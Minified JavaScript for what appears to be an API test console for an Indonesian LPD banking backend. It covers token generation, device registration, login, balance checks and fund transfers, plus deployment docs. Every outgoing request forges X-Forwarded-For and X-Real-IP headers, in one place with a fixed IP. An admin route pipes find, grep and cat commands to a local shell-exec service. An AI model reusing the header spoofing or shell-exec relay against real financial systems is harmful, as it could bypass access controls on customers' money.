    const a = F(), i = await lt(a), n = e + "/api/smart/access/token", r = { "Content-Type": "application/json", "X-TIMESTAMP": a, "X-CLIENT-ID": t, "X-SIGNATURE": i.signature, "X-Forwarded-For": Ne, "X-Real-IP": Ne }, o = JSON.stringify({ credential: "{get-token}" }), d = await fetch(n, { method: "POST", headers: r, body: o }), u = await d.text();
    let b = {};
    try {
      b = JSON.parse(u);
    } catch {
      b = { _raw: u };
    }
    const l = b.token || "", c = b.status || "";
    return c === "2007300" && l ? { ok: true, token: l } : { ok: false, error: `${c || "HTTP " + d.status}: ${b.message || u.slice(0, 200)}` };
  } catch (a) {
    return { ok: false, error: a.message };
  }
}
__name(es, "es");
K.post("/api/smart/get-ios-token", async (e) => {
  try {
    const t = await e.req.json(), { baseUrl: s, clientIdEnc: a, aesCs: i } = t;
    if (!a) return e.json({ ok: false, error: "clientIdEnc wajib diisi \u2014 jalankan Auto Setup terlebih dahulu" });
    const n = (s || "https://lpdseminyak.biz.id:8000").replace(/\/+$/, ""), r = await es(n, a, i || "");
    return e.json({ ok: r.ok, token: r.token, error: r.error, expiresIn: 180 });
  } catch (t) {
    return e.json({ ok: false, error: t.message });
  }
});
K.post("/api/smart/register", async (e) => {
  try {
    const t = await e.req.json(), { baseUrl: s, clientIdEnc: a, imei: i, user_name: n, user_pass: r } = t;
    if (!a) return e.json({ ok: false, error: "clientIdEnc wajib diisi" });
    if (!i) return e.json({ ok: false, error: "imei wajib diisi" });
    const o = (s || "https://lpdseminyak.biz.id:8000").replace(/\/+$/, ""), d = F(), u = ke(), b = X(), l = await et(b, u), { aesCs: c } = await it(i, d), f = await Ee(l, d, c), g = /* @__PURE__ */ __name((P) => Kt(P), "g"), h = /* @__PURE__ */ __name((P) => /^[0-9a-f]{32}$/i.test(P), "h"), k = n ? h(n) ? n : g(n) : "", y = r ? h(r) ? r : g(r) : "", p = o + "/api/smart/access/register", w = JSON.stringify({ user_name: k, user_pass: y }), v = { "Content-Type": "application/json", Authorization: l, "X-TIMESTAMP": d, "X-SIGNATURE": f, "X-PARTNER-ID": f, "X-CLIENT-ID": a, "X-REFERENCE": b, "X-Forwarded-For": Ne, "X-Real-IP": Ne };
    let T = 0, S = {};
    try {
      const P = await fetch(p, { method: "POST", headers: v, body: w });
      T = P.status;
      const N = await P.text();
      try {
        S = JSON.parse(N);
      } catch {
        S = { _raw: N };
      }
    } catch (P) {
      S = { _fetchError: P.message };
    }
    const x = T >= 200 && T < 300 && (S.status === "00" || S.status === "2007300");
    return e.json({ ok: x, action: "register", httpStatus: T, url: p, result: S, aesKeys: { aesCs: c }, debug: { ts: d, ref: b, imei: i, partnerId: f.slice(0, 20) + "..." }, headers: v });
  } catch (t) {
    return e.json({ ok: false, error: t.message });
  }
});
K.post("/api/smart", async (e) => {
  var t;
  try {
    const s = await e.req.json(), { action: a, baseUrl: i, aesKey: n, aesIv: r, aesCs: o, clientIdEnc: d, transNo: u, iosToken: b, ...l } = s, c = (i || "https://lpdseminyak.biz.id:8000").replace(/\/+$/, ""), f = /* @__PURE__ */ __name((k) => Kt(k), "f"), g = /* @__PURE__ */ __name((k) => /^[0-9a-f]{32}$/i.test(k), "g");
    if (a === "login") {
      if (!l.user_name || !l.user_pass) throw new Error("user_name dan user_pass wajib diisi");
      if (!d) throw new Error("clientIdEnc (X-CLIENT-ID) wajib diisi");
      const k = g(l.user_name) ? l.user_name : f(l.user_name), y = g(l.user_pass) ? l.user_pass : f(l.user_pass), { headers: p, ts: w, xref: v, jwt: T, sig: S } = await $(o, d, u, b), x = c + "/api/smart/access/login", P = JSON.stringify({ user_name: k, user_pass: y });
      let N = 0, B = {};
      try {
        const L = await fetch(x, { method: "POST", headers: p, body: P });
        N = L.status;
        const M = await L.text();
        try {
          B = JSON.parse(M);
        } catch {
          B = { _raw: M };
        }
      } catch (L) {
        return e.json({ ok: false, action: a, error: L.message, url: x, headers: p });
      }
      const O = N >= 200 && N < 300 && B.status === "00";
      let _ = null;
      if (O && B.account_list && n && r) try {
        const L = await ot(B.account_list, n, r);
        if (L) {
          const M = Za(L);
          _ = { nama: ((t = M[0]) == null ? void 0 : t.nama) || "", noid: l.user_name, accounts: M };
        }
      } catch {
      }
      return e.json({ ok: O, action: a, httpStatus: N, url: x, result: B, nasabah: _, debug: { ts: w, xref: v, user_name_sent: k, user_pass_sent: y, jwt_preview: T.substring(0, 40) + "...", sig_preview: S.substring(0, 20) + "..." }, requestHeaders: p });
    }
    if (a === "cek-saldo") {
      if (!l.no_rek) throw new Error("no_rek wajib diisi");
      if (!d) throw new Error("clientIdEnc wajib diisi");
      if (!n || !r) throw new Error("aesKey dan aesIv wajib diisi");
      const k = await I(l.no_rek, n, r), { headers: y, ts: p, xref: w } = await $(o, d, u, b), v = c + "/api/smart/account/balance", T = JSON.stringify({ no_rek: k });
      let S = 0, x = {};
      try {
        const P = await fetch(v, { method: "POST", headers: y, body: T });
        S = P.status;
        const N = await P.text();
        try {
          x = JSON.parse(N);
        } catch {
          x = { _raw: N };
        }
      } catch (P) {
        return e.json({ ok: false, action: a, error: P.message });
      }
      return e.json({ ok: S >= 200 && S < 300, action: a, httpStatus: S, url: v, result: x, debug: { ts: p, xref: w, no_rek_enc: k }, requestHeaders: y });
    }
    if (a === "inquiry") {
      if (!l.no_rek_from || !l.no_rek_to || !l.nominal) throw new Error("no_rek_from, no_rek_to, nominal wajib diisi");
      if (!d) throw new Error("clientIdEnc wajib diisi");
      const k = u || X(), { headers: y, ts: p, xref: w } = await $(o, d, k, b), [v, T, S, x] = await Promise.all([I(l.no_rek_from, n, r), I(l.no_rek_to, n, r), I(l.nominal, n, r), l.bank_dest ? I(l.bank_dest, n, r) : Promise.resolve("")]), P = c + "/api/smart/transfer/inquiry", N = JSON.stringify({ no_rek_from: v, no_rek_to: T, nominal: S, bank_dest: x, ref_no: k });
      let B = 0, O = {};
      try {
        const _ = await fetch(P, { method: "POST", headers: y, body: N });
        B = _.status;
        const L = await _.text();
        try {
          O = JSON.parse(L);
        } catch {
          O = { _raw: L };
        }
      } catch (_) {
        return e.json({ ok: false, action: a, error: _.message });
      }
      return e.json({ ok: B >= 200 && B < 300, action: a, httpStatus: B, url: P, result: O, debug: { ts: p, xref: w, ref: k }, requestHeaders: y });
    }
    if (a === "posting") {
      if (!l.no_rek_from || !l.no_rek_to || !l.nominal) throw new Error("no_rek_from, no_rek_to, nominal wajib diisi");
      if (!d) throw new Error("clientIdEnc wajib diisi");
      const k = u || X(), { headers: y, ts: p, xref: w } = await $(o, d, k, b), [v, T, S, x, P, N] = await Promise.all([I(l.no_rek_from, n, r), I(l.no_rek_to, n, r), I(l.nominal, n, r), l.bank_dest ? I(l.bank_dest, n, r) : Promise.resolve(""), l.nama_dest ? I(l.nama_dest, n, r) : Promise.resolve(""), l.keterangan ? I(l.keterangan, n, r) : Promise.resolve("")]), B = c + "/api/smart/transfer/posting", O = JSON.stringify({ no_rek_from: v, no_rek_to: T, nominal: S, bank_dest: x, nama_dest: P, keterangan: N, ref_no: k });
      let _ = 0, L = {};
      try {
        const M = await fetch(B, { method: "POST", headers: y, body: O });
        _ = M.status;
        const ie = await M.text();
        try {
          L = JSON.parse(ie);
        } catch {
          L = { _raw: ie };
        }
      } catch (M) {
        return e.json({ ok: false, action: a, error: M.message });
      }
      return e.json({ ok: _ >= 200 && _ < 300, action: a, httpStatus: _, url: B, result: L, debug: { ts: p, xref: w, ref: k }, requestHeaders: y });
    }
    const h = /* @__PURE__ */ __name(async (k, y, p) => {
      const w = await fetch(k, { method: "POST", headers: y, body: p }), v = await w.text();
      let T;
      try {
        T = JSON.parse(v);
      } catch {
        T = { _raw: v };
      }
      return { httpStatus: w.status, parsed: T };
    }, "h");
    if (a === "logout") {
      if (!d) throw new Error("clientIdEnc wajib diisi");
      const { headers: k, ts: y, xref: p } = await $(o, d, void 0, b), w = c + "/api/smart/access/logout";
      try {
        const { httpStatus: v, parsed: T } = await h(w, k, "{}");
        return e.json({ ok: v < 400, action: a, httpStatus: v, url: w, result: T, debug: { ts: y, xref: p } });
      } catch (v) {
        return e.json({ ok: false, action: a, error: v.message });
      }
    }
    if (a === "account-list") {
      if (!d) throw new Error("clientIdEnc wajib diisi");
      if (!n || !r) throw new Error("aesKey dan aesIv wajib diisi");
      const k = await I(l.customer_id || "", n, r), { headers: y, ts: p, xref: w } = await $(o, d, void 0, b), v = c + "/api/smart/tabungan/account-list", T = JSON.stringify({ customer_id: k });
      try {
        const { httpStatus: S, parsed: x } = await h(v, y, T);
        return e.json({ ok: S < 400, action: a, httpStatus: S, url: v, result: x, debug: { ts: p, xref: w, customer_id_enc: k } });
      } catch (S) {
        return e.json({ ok: false, action: a, error: S.message });
      }
    }
    if (a === "mutasi-history") {
      if (!d) throw new Error("clientIdEnc wajib diisi");
      if (!n || !r) throw new Error("aesKey dan aesIv wajib diisi");
      const k = await I(l.customer_id || "", n, r), { headers: y, ts: p, xref: w } = await $(o, d, void 0, b), v = c + "/api/smart/tabungan/mutasi-history", T = JSON.stringify({ customer_id: k });
      try {
        const { httpStatus: S, parsed: x } = await h(v, y, T);
        return e.json({ ok: S < 400, action: a, httpStatus: S, url: v, result: x, debug: { ts: p, xref: w, customer_id_enc: k } });
      } catch (S) {
        return e.json({ ok: false, action: a, error: S.message });
      }
    }
    if (a === "transaction-history") {
      if (!d) throw new Error("clientIdEnc wajib diisi");
      if (!n || !r) throw new Error("aesKey dan aesIv wajib diisi");
      const k = await I(l.no_rek || "", n, r), y = await I(l.tgl_awal || "", n, r), p = await I(l.tgl_akhir || "", n, r), { headers: w, ts: v, xref: T } = await $(o, d, void 0, b), S = c + "/api/smart/tabungan/transaction-history", x = JSON.stringify({ no_rek: k, tgl_awal: y, tgl_akhir: p });
      try {
        const { httpStatus: P, parsed: N } = await h(S, w, x);
        return e.json({ ok: P < 400, action: a, httpStatus: P, url: S, result: N, debug: { ts: v, xref: T } });
      } catch (P) {
        return e.json({ ok: false, action: a, error: P.message });
      }
    }
    if (a === "transfer-lpd-check") {
      if (!l.no_rek_tujuan) throw new Error("no_rek_tujuan wajib diisi");
      if (!d) throw new Error("clientIdEnc wajib diisi");
      if (!n || !r) throw new Error("aesKey dan aesIv wajib diisi");
      const k = X(), y = await I(l.no_rek_tujuan, n, r), { headers: p, ts: w, xref: v } = await $(o, d, k, b), T = c + "/api/smart/transfer/lpd/check", S = JSON.stringify({ account_no: y });
      try {
        const { httpStatus: x, parsed: P } = await h(T, p, S);
        return e.json({ ok: x < 400, action: a, httpStatus: x, url: T, result: P, debug: { ts: w, xref: v, ref: k, account_no_enc: y } });
      } catch (x) {
        return e.json({ ok: false, action: a, error: x.message });
      }
    }
    if (a === "transfer-lpd-inquiry") {
      if (!l.no_rek_from || !l.no_rek_to || !l.nominal) throw new Error("no_rek_from, no_rek_to, nominal wajib diisi");
      if (!d) throw new Error("clientIdEnc wajib diisi");
      if (!n || !r) throw new Error("aesKey dan aesIv wajib diisi");
      const k = u || X(), { headers: y, ts: p, xref: w } = await $(o, d, k, b), [v, T, S, x, P, N] = await Promise.all([I(l.no_rek_from, n, r), I(l.no_rek_to, n, r), I(l.nama_tujuan || "", n, r), I(l.nominal, n, r), I(l.date_time || F(), n, r), I(l.keterangan || "", n, r)]), B = c + "/api/smart/transfer/lpd/inquiry", O = JSON.stringify({ to_acc: T, to_name: S, from_acc: v, from_name: v, amount: x, remark: N });
      try {
        const { httpStatus: _, parsed: L } = await h(B, y, O);
        return e.json({ ok: _ < 400, action: a, httpStatus: _, url: B, result: L, debug: { ts: p, xref: w, ref: k } });
      } catch (_) {
        return e.json({ ok: false, action: a, error: _.message });
      }
    }
    if (a === "transfer-lpd-posting") {
      if (!l.no_rek_from || !l.no_rek_to || !l.nominal) throw new Error("no_rek_from, no_rek_to, nominal wajib diisi");
      if (!d) throw new Error("clientIdEnc wajib diisi");
      if (!n || !r) throw new Error("aesKey dan aesIv wajib diisi");
      const k = u || X(), { headers: y, ts: p, xref: w } = await $(o, d, k, b), [v, T, S, x, P, N] = await Promise.all([I(l.no_rek_from, n, r), I(l.no_rek_to, n, r), I(l.nama_tujuan || "", n, r), I(l.nominal, n, r), I(l.date_time || F(), n, r), I(l.keterangan || "", n, r)]), B = c + "/api/smart/transfer/lpd/post", O = JSON.stringify({ to_acc: T, to_name: S, from_acc: v, from_name: v, amount: x, remark: N });
      try {
        const { httpStatus: _, parsed: L } = await h(B, y, O);
        return e.json({ ok: _ < 400, action: a, httpStatus: _, url: B, result: L, debug: { ts: p, xref: w, ref: k } });
      } catch (_) {
        return e.json({ ok: false, action: a, error: _.message });
      }
    }
    if (a === "transfer-bank-check") {
      if (!l.no_rek_tujuan || !l.kode_bank) throw new Error("no_rek_tujuan dan kode_bank wajib diisi");
      if (!d) throw new Error("clientIdEnc wajib diisi");
      if (!n || !r) throw new Error("aesKey dan aesIv wajib diisi");
      const k = X(), [y, p] = await Promise.all([I(l.no_rek_tujuan, n, r), I(l.kode_bank, n, r)]), { headers: w, ts: v, xref: T } = await $(o, d, k, b), S = c + "/api/smart/transfer/bank/check", x = JSON.stringify({ account_no: y, bank_code: p });
      try {
        const { httpStatus: P, parsed: N } = await h(S, w, x);
        return e.json({ ok: P < 400, action: a, httpStatus: P, url: S, result: N, debug: { ts: v, xref: T, ref: k } });
      } catch (P) {
        return e.json({ ok: false, action: a, error: P.message });
      }
    }
    if (a === "transfer-bank-inquiry") {
      if (!l.no_rek_from || !l.no_rek_to || !l.nominal || !l.kode_bank) throw new Error("no_rek_from, no_rek_to, nominal, kode_bank wajib diisi");
      if (!d) throw new Error("clientIdEnc wajib diisi");
      if (!n || !r) throw new Error("aesKey dan aesIv wajib diisi");
      const k = u || X(), { headers: y, ts: p, xref: w } = await $(o, d, k, b), [v, T, S, x, P, N] = await Promise.all([I(l.no_rek_from, n, r), I(l.no_rek_to, n, r), I(l.kode_bank, n, r), I(l.nominal, n, r), I(l.date_time || F(), n, r), I(l.hash_code || "", n, r)]), B = c + "/api/smart/transfer/bank/inquiry", O = JSON.stringify({ from_acc: v, to_acc: T, bank_code: S, amount: x, date_time: P, hash_code: N, remark: "" });
      try {
        const { httpStatus: _, parsed: L } = await h(B, y, O);
        return e.json({ ok: _ < 400, action: a, httpStatus: _, url: B, result: L, debug: { ts: p, xref: w, ref: k } });
      } catch (_) {
        return e.json({ ok: false, action: a, error: _.message });
      }
    }
    if (a === "transfer-bank-posting") {
      if (!l.no_rek_from || !l.no_rek_to || !l.nominal || !l.kode_bank) throw new Error("no_rek_from, no_rek_to, nominal, kode_bank wajib diisi");
      if (!d) throw new Error("clientIdEnc wajib diisi");
      if (!n || !r) throw new Error("aesKey dan aesIv wajib diisi");
      const k = u || X(), { headers: y, ts: p, xref: w } = await $(o, d, k, b), [v, T, S, x, P, N, B] = await Promise.all([I(l.no_rek_from, n, r), I(l.no_rek_to, n, r), I(l.kode_bank, n, r), I(l.nominal, n, r), I(l.date_time || F(), n, r), I(l.hash_code || "", n, r), I(l.keterangan || "", n, r)]), O = c + "/api/smart/transfer/bank/post", _ = JSON.stringify({ from_acc: v, to_acc: T, bank_code: S, amount: x, date_time: P, hash_code: N, remark: B });
      try {
        const { httpStatus: L, parsed: M } = await h(O, y, _);
        return e.json({ ok: L < 400, action: a, httpStatus: L, url: O, result: M, debug: { ts: p, xref: w, ref: k } });
      } catch (L) {
        return e.json({ ok: false, action: a, error: L.message });
      }
    }
    return e.json({ ok: false, error: "Unknown action: " + a });
  } catch (s) {
    const a = s instanceof Error ? s.message : String(s);
    return e.json({ ok: false, error: "Smart error: " + a });
  }
});
K.post("/api/token/generate", async (e) => {
  try {
    const t = await e.req.json(), { type: s, baseUrl: a, clientIdEnc: i, clientKey: n } = t;
    let r;
    if (s === "ios") {
      const o = F(), d = await lt(o), u = (a || "https://lpdseminyak.biz.id:8000") + "/api/smart/access/token", b = { "Content-Type": "application/json", "X-TIMESTAMP": o, "X-CLIENT-ID": i || "", "X-SIGNATURE": d.signature, "X-Forwarded-For": "34.50.74.78", "X-Real-IP": "34.50.74.78" };
      try {
        const l = await fetch(u, { method: "POST", headers: b, body: JSON.stringify({ credential: "{get-token}" }) }), c = await l.text();
        let f;
        try {
          f = JSON.parse(c);
        } catch {
          f = { _raw: c };
        }
        r = { ok: l.status < 400, httpStatus: l.status, result: f, debug: d };
      } catch (l) {
        r = { ok: false, error: l.message };
      }
    } else if (s === "snap") {
      const o = ke();
      r = { ok: true, result: await Ft(n || "LPD-SEMINYAK-001", o) };
    } else r = { ok: false, error: "type must be snap or ios" };
    return e.json(r);
  } catch (t) {
    const s = t instanceof Error ? t.message : String(t);
    return e.json({ ok: false, error: "Token error: " + s });
  }
});
var Q = "/home/user/webapp/lpd_seminyak/storage/logs";
K.post("/api/admin", async (e) => {
  try {
    const t = await e.req.json(), s = t.op;
    if (s === "list-logs") {
      const r = ((await (await fetch("http://127.0.0.1:3001/exec", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ command: `find ${Q} -maxdepth 2 \\( -name "*.txt" -o -name "*.log" \\) | sort -r | head -200` }) })).json()).stdout || "").trim().split(`
`).filter(Boolean).map((k) => {
        const y = k.split("/").pop() || "", p = k.replace(Q + "/", "").replace("/" + y, "");
        return { name: y, dir: p === y ? "root" : p, path: k };
      }), d = await (await fetch("http://127.0.0.1:3001/exec", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ command: `grep -c "local.ERROR" ${Q}/laravel.log 2>/dev/null || echo 0` }) })).json(), u = parseInt((d.stdout || "0").trim()) || 0, l = await (await fetch("http://127.0.0.1:3001/exec", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ command: `grep -h "POST http" ${Q}/access-*.txt ${Q}/transfer-*.txt ${Q}/tabungan-*.txt 2>/dev/null | grep -oP '/api/[a-z/._-]+' | sort | uniq -c | sort -rn | head -20` }) })).json(), c = {};
      (l.stdout || "").trim().split(`
`).forEach((k) => {
        const y = k.trim().match(/^(\d+)\s+(.+)$/);
        y && (c[y[2]] = parseInt(y[1]));
      });
      const g = await (await fetch("http://127.0.0.1:3001/exec", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ command: `grep -h "REQUEST" ${Q}/access-*.txt 2>/dev/null | grep -oP '\\d{4}-\\d{2}-\\d{2}' | sort | uniq -c | tail -30` }) })).json(), h = {};
      return (g.stdout || "").trim().split(`
`).forEach((k) => {
        const y = k.trim().match(/^(\d+)\s+(\d{4}-\d{2}-\d{2})$/);
        y && (h[y[2]] = parseInt(y[1]));
      }), e.json({ ok: true, files: r, error_count: u, endpoints: c, daily: h });
    }
    if (s === "read-log") {
      const a = (t.path || "").replace(/\.\./g, "").replace(/[^a-zA-Z0-9._\-]/g, ""), i = (t.dir || "root").replace(/\.\./g, "").replace(/[^a-zA-Z0-9._\-]/g, "");
      let n = "";
      i === "root" ? n = `${Q}/${a}` : n = `${Q}/${i}/${a}`;
      const o = await (await fetch("http://127.0.0.1:3001/exec", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ command: `cat "${n}" 2>/dev/null | head -c 500000` }) })).json();
      return !o.stdout || o.stdout.trim() === "" ? e.json({ ok: false, error: `File tidak ditemukan atau kosong: ${a}` }) : e.json({ ok: true, content: o.stdout, path: n });
    }
    return e.json({ ok: false, error: "Unknown operation: " + s });
  } catch (t) {
    const s = t instanceof Error ? t.message : String(t);
    return s.includes("fetch") || s.includes("ECONNREFUSED") || s.includes("refused") ? e.json({ ok: false, error: "Admin panel memerlukan sandbox environment. Di production, fitur baca log tidak tersedia karena tidak ada akses filesystem." }) : e.json({ ok: false, error: "Admin error: " + s });
  }
});
K.get("/", (e) => e.redirect("/admin"));
K.get("/swagger", (e) => e.html(ja()));
K.get("/admin", (e) => e.html(Ua()));
K.get("/crypto", (e) => e.html(Ka()));
K.get("/docs", (e) => {
  const t = ts();
  return e.html(t);
});
function ts() {
  const e = { installPhp: ["# Ubuntu/Debian:", "sudo apt-get install -y software-properties-common", "sudo add-apt-repository ppa:ondrej/php", "sudo apt-get update", "sudo apt-get install -y php7.4 php7.4-cli php7.4-mbstring php7.4-xml \\", "  php7.4-curl php7.4-zip php7.4-json php7.4-pdo php7.4-intl", "", "# Verifikasi:", "php7.4 --version"].join(`
`), installOdbc: ["# Install ODBC Driver 17 (Ubuntu):", "curl https://packages.microsoft.com/keys/microsoft.asc | apt-key add -", "curl https://packages.microsoft.com/config/ubuntu/20.04/prod.list \\", "  > /etc/apt/sources.list.d/mssql-release.list", "sudo apt-get update", "sudo ACCEPT_EULA=Y apt-get install -y msodbcsql17 unixodbc-dev", "", "# Install ekstensi PHP sqlsrv:", "sudo pecl install sqlsrv pdo_sqlsrv", 'echo "extension=sqlsrv.so" >> /etc/php/7.4/cli/php.ini', 'echo "extension=pdo_sqlsrv.so" >> /etc/php/7.4/cli/php.ini'].join(`
`), extractCode: ["# Extract dari zip:", "unzip lpd_seminyak.zip -d /var/www/html/", "", "# Atau clone dari repository (jika ada):", "git clone https://your-repo.git /var/www/html/lpd_seminyak", "", "# Masuk ke direktori:", "cd /var/www/html/lpd_seminyak"].join(`
`), composerInstall: ["# Install composer (jika belum ada):", "curl -sS https://getcomposer.org/installer | php7.4", "mv composer.phar /usr/local/bin/composer", "", "# Install dependencies:", "cd /var/www/html/lpd_seminyak", "COMPOSER_ALLOW_SUPERUSER=1 composer install --no-dev \\", "  --no-interaction --ignore-platform-reqs", "", "# Jika ada error autoload, jalankan:", "composer dump-autoload --no-scripts --optimize"].join(`
`), envSetup: ["cp .env.example .env", "", "# Generate application key:", "php7.4 artisan key:generate", "", "# Edit file .env:", "nano .env"].join(`
`), envMinimal: ["APP_URL=https://your-domain.com", "DB_HOST=your-sqlserver-host", "DB_DATABASE=Giosoft_LPD", "DB_USERNAME=sa", "DB_PASSWORD=your-password", "", "# Path key absolut sesuai OS:", "PUBLIC_KEY_LPD=/var/www/html/lpd_seminyak/keys/public_key.pem", "PUBLIC_KEY_BPD=/var/www/html/lpd_seminyak/public_key_bpd.pem", "MASTER_BANK_LIST=/var/www/html/lpd_seminyak/bank.list", "MASTER_PPOB_LIST=/var/www/html/lpd_seminyak/ppob.list", "MASTER_DISPLAY_LIST=/var/www/html/lpd_seminyak/display.list"].join(`
`), keysSetup: ["mkdir -p /var/www/html/lpd_seminyak/keys", "cp public_key_lpd.pem keys/public_key.pem", "chmod 644 keys/public_key.pem"].join(`
`), permissions: ["chmod -R 775 /var/www/html/lpd_seminyak/storage", "chmod -R 775 /var/www/html/lpd_seminyak/bootstrap/cache", "chown -R www-data:www-data /var/www/html/lpd_seminyak/storage"].join(`
`), dbSchema: ["-- Di SQL Server Management Studio:", "CREATE DATABASE Giosoft_LPD;", "USE Giosoft_LPD;", "", "-- Tabel utama yang diperlukan:", "-- gmob_nasabah, gmob_token, gmob_request, gmob_transfer,", "-- gmob_transferlog, gmob_payment, gmob_log, gmob_access,", "-- gmob_rekening, gmob_responcode, gmob_counter, gmob_listaccount,", "-- gtb_nasabah, gtb_folio, gak_mutasi, gak_ledger,", "-- gum_config, gak_bookstatus, gcore_bankcode, gcore_transfer,", "-- gcore_log, gppob_produk, gppob_inquiry, gppob_transaction"].join(`
`), apacheConf: ["# /etc/apache2/sites-available/lpd_seminyak.conf", "<VirtualHost *:80>", "    ServerName your-domain.com", "    DocumentRoot /var/www/html/lpd_seminyak/public", "    ", "    <Directory /var/www/html/lpd_seminyak/public>", "        AllowOverride All", "        Require all granted", "    </Directory>", "    ", "    ErrorLog ${APACHE_LOG_DIR}/lpd_error.log", "    CustomLog ${APACHE_LOG_DIR}/lpd_access.log combined", "</VirtualHost>", "", "# Aktifkan:", "a2ensite lpd_seminyak.conf", "a2enmod rewrite", "systemctl restart apache2"].join(`
`), verify: ["# Cek bootstrap Laravel:", "php7.4 artisan env", "", "# Test koneksi database:", "php7.4 artisan tinker", "# Di dalam tinker:", "DB::connection()->getPdo()", "", "# Test akses API:", "curl -X POST https://your-domain.com/v1.0/access-token/b2b \\", '  -H "Content-Type: application/json" \\', `  -d '{"grantType":"client_credentials"}'`].join(`
`) };
  return `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Dokumentasi LPD Seminyak API</title>
<script src="https://cdn.tailwindcss.com"><\/script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css"/>
<style>
:root{--primary:#1e40af;--primary-light:#3b82f6;--secondary:#0f172a;--sidebar-w:280px}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',system-ui,sans-serif;background:#f1f5f9;color:#1e293b}
#sidebar{position:fixed;top:0;left:0;width:var(--sidebar-w);height:100vh;background:var(--secondary);color:#e2e8f0;overflow-y:auto;z-index:100;transition:transform .3s}
#sidebar .logo{padding:20px 16px 16px;border-bottom:1px solid #334155;background:linear-gradient(135deg,#1e3a8a,#1d4ed8)}
#sidebar .logo h1{font-size:18px;font-weight:700;color:#fff}
#sidebar .logo p{font-size:11px;color:#93c5fd;margin-top:2px}
#sidebar nav a{display:flex;align-items:center;gap:10px;padding:9px 16px;font-size:13px;color:#94a3b8;text-decoration:none;transition:all .15s;cursor:pointer;border-left:3px solid transparent}
#sidebar nav a:hover,#sidebar nav a.active{color:#fff;background:rgba(255,255,255,.07);border-left-color:var(--primary-light)}
#sidebar nav a i{width:18px;text-align:center;font-size:14px}
#sidebar .nav-section{padding:12px 16px 4px;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1px;color:#475569}
#main{margin-left:var(--sidebar-w);min-height:100vh}
.topbar{position:sticky;top:0;z-index:50;background:#fff;border-bottom:1px solid #e2e8f0;padding:14px 32px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 1px 3px rgba(0,0,0,.08)}
.topbar h2{font-size:20px;font-weight:700;color:var(--secondary)}
.badge{display:inline-block;padding:3px 10px;border-radius:999px;font-size:11px;font-weight:600}
.badge-blue{background:#dbeafe;color:#1d4ed8}.badge-green{background:#d1fae5;color:#065f46}
.badge-yellow{background:#fef3c7;color:#92400e}.badge-red{background:#fee2e2;color:#991b1b}
.badge-purple{background:#ede9fe;color:#5b21b6}
.content{padding:32px}
.section{display:none}.section.active{display:block}
.card{background:#fff;border-radius:12px;box-shadow:0 1px 3px rgba(0,0,0,.06);margin-bottom:24px;overflow:hidden}
.card-header{padding:16px 20px;border-bottom:1px solid #f1f5f9;display:flex;align-items:center;gap:10px}
.card-header h3{font-size:15px;font-weight:700;color:var(--secondary)}
.card-body{padding:20px}
.endpoint{border:1px solid #e2e8f0;border-radius:10px;margin-bottom:16px;overflow:hidden}
.endpoint-header{padding:12px 16px;display:flex;align-items:center;gap:10px;cursor:pointer;background:#f8fafc;transition:background .15s}
.endpoint-header:hover{background:#f1f5f9}
.method{font-size:11px;font-weight:700;padding:3px 8px;border-radius:4px;min-width:48px;text-align:center}
.method-post{background:#fef3c7;color:#92400e}.method-get{background:#d1fae5;color:#065f46}
.endpoint-path{font-family:monospace;font-size:13px;font-weight:600;color:#1e40af}
.endpoint-body{padding:16px;border-top:1px solid #f1f5f9;background:#fff}
.endpoint-body.hidden{display:none}
pre{background:#0f172a;color:#e2e8f0;padding:16px;border-radius:8px;font-size:12px;line-height:1.6;overflow-x:auto;margin:8px 0;white-space:pre-wrap;word-break:break-all}
code{font-family:'Courier New',monospace}
.inline-code{background:#f1f5f9;color:#0f172a;padding:1px 6px;border-radius:4px;font-family:monospace;font-size:12px}
table{width:100%;border-collapse:collapse;font-size:13px}
th{background:#f8fafc;padding:10px 14px;text-align:left;font-weight:600;color:#374151;border-bottom:2px solid #e5e7eb}
td{padding:10px 14px;border-bottom:1px solid #f3f4f6;vertical-align:top}
tr:last-child td{border-bottom:none}
.info-box{padding:12px 16px;border-radius:8px;font-size:13px;margin:12px 0;display:flex;gap:10px;align-items:flex-start}
.info-box i{margin-top:1px;flex-shrink:0}
.info-blue{background:#eff6ff;border-left:4px solid #3b82f6;color:#1e40af}
.info-yellow{background:#fffbeb;border-left:4px solid #f59e0b;color:#92400e}
.info-red{background:#fef2f2;border-left:4px solid #ef4444;color:#991b1b}
.steps{}
.step{display:flex;gap:16px;margin-bottom:20px;padding:16px;background:#f8fafc;border-radius:10px}
.step-num{width:32px;height:32px;background:var(--primary);color:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:14px;flex-shrink:0}
.step-content h4{font-weight:700;margin-bottom:6px;font-size:14px}
.step-content p{font-size:13px;color:#4b5563;line-height:1.6}
.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:16px;margin-bottom:24px}
.stat-card{background:#fff;padding:20px;border-radius:12px;box-shadow:0 1px 3px rgba(0,0,0,.06);text-align:center}
.stat-card .stat-num{font-size:32px;font-weight:800}
.stat-card .stat-label{font-size:12px;color:#64748b;margin-top:4px}
.flow{display:flex;align-items:center;gap:0;flex-wrap:wrap;margin:12px 0}
.flow-step{background:#dbeafe;color:#1e40af;padding:8px 14px;border-radius:6px;font-size:12px;font-weight:600}
.flow-arrow{padding:0 8px;color:#94a3b8;font-size:18px}
.db-table{background:#1e293b;color:#e2e8f0;border-radius:8px;overflow:hidden;margin-bottom:16px}
.db-table-header{background:#0f172a;padding:10px 16px;font-weight:700;font-family:monospace;color:#38bdf8;font-size:14px}
.db-table-body{padding:12px 16px}
.db-col{display:flex;gap:12px;padding:4px 0;font-size:12px;font-family:monospace;border-bottom:1px solid #334155}
.db-col:last-child{border-bottom:none}
.db-col-name{color:#fbbf24;min-width:160px}
.db-col-type{color:#34d399;min-width:100px}
